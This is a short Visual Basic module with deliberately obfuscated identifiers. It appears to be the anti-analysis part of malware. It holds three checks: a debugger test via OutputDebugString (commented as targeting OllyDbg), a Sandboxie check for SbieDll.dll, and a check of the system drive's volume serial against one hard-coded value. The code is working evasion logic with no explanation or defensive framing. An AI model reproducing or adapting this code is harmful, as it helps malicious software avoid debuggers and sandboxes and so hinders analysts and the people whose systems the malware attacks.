Attribute VB_Name = "ntiideb"
Private Declare Function GetVolumeInformation Lib "kernel32.dll" Alias "GetVolumeInformationA" (ByVal vqjvjqijozopjzchezruk As String, ByVal lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Integer, lpVolumeziodizpdopppppppeber As Long, lpMaximumComponentLength As Long, lpFileSystemFlags As Long, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Long) As Long
Public Declare Function GetModuleHandle Lib "kernel32" Alias "GetModuleHandleA" (ByVal fofjopopozpoospd As String) As Long
Private Declare Function OutputDebugString Lib "kernel32" Alias "OutputDebugStringA" (ByVal lpOutputString As String) As Long
'Anti-zkofiddoodododoodgs (OllyDbG, ..)
Public Function zkofiddoodododoodg() As Boolean
    zkofiddoodododoodg = Not (OutputDebugString(VarPtr(ByVal "=)")) = 1)
End Function

Public Function dsiiusdgvpvdpowiope() As Boolean
    Dim sijcsupvoiixpowkivoqsm As Long
    sijcsupvoiixpowkivoqsm = GetModuleHandle("SbieDll.dll")
    If sijcsupvoiixpowkivoqsm = 0 Then
        dsiiusdgvpvdpowiope = False
    Else
        dsiiusdgvpvdpowiope = True
    End If
End Function

'Anti-eurojpspsopoipe
Public Function eurojpspsopoipe() As Boolean

Dim ziodizpdopppppppe As Long
Dim Res As Long
Dim qjgpjupepjpred As String
Dim piollplkozkjkmckvmjzmjpfs As String
 
qjgpjupepjpred = String$(255, Chr$(0))
piollplkozkjkmckvmjzmjpfs = String$(255, Chr$(0))
Res = GetVolumeInformation(Environ("SystemDrive") & "\", qjgpjupepjpred, Len(qjgpjupepjpred), ziodizpdopppppppe, 0, 0, _
piollplkozkjkmckvmjzmjpfs, Len(piollplkozkjkmckvmjzmjpfs))
 
If ziodizpdopppppppe = 1824245000 Then
    eurojpspsopoipe = True
Else
    eurojpspsopoipe = False
End If

End Function

